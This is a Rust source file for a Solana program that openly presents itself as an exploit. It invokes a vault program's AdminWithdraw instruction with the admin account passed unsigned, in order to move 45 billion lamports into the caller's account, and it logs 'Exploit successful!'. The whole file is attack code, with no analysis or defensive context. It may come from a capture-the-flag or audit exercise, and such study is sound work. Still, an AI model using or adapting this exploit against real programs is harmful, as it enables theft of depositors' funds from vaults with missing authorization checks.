use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    pubkey::Pubkey,
    instruction::{AccountMeta, Instruction},
};
use borsh::BorshSerialize;

#[derive(BorshSerialize)]
pub enum VaultInstruction {
    Initialize,
    Deposit { amount: u64 },
    AdminWithdraw { amount: u64 },
}

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    msg!("Exploit starting...");
    
    let account_info_iter = &mut accounts.iter();
    let user_account = next_account_info(account_info_iter)?;
    let vault_program = next_account_info(account_info_iter)?;
    let vault_pda = next_account_info(account_info_iter)?;
    let admin_pubkey = next_account_info(account_info_iter)?;
    
    let steal_amount: u64 = 45_000_000_000;
    
    let malicious_instruction = Instruction {
        program_id: *vault_program.key,
        accounts: vec![
            AccountMeta::new(*vault_pda.key, false),
            AccountMeta::new(*admin_pubkey.key, false),
            AccountMeta::new(*user_account.key, false),
        ],
        data: VaultInstruction::AdminWithdraw { amount: steal_amount }
            .try_to_vec()
            .unwrap(),
    };
    
    invoke(
        &malicious_instruction,
        &[
            vault_pda.clone(),
            admin_pubkey.clone(),
            user_account.clone(),
        ],
    )?;
    
    msg!("Exploit successful!");
    
    Ok(())
}
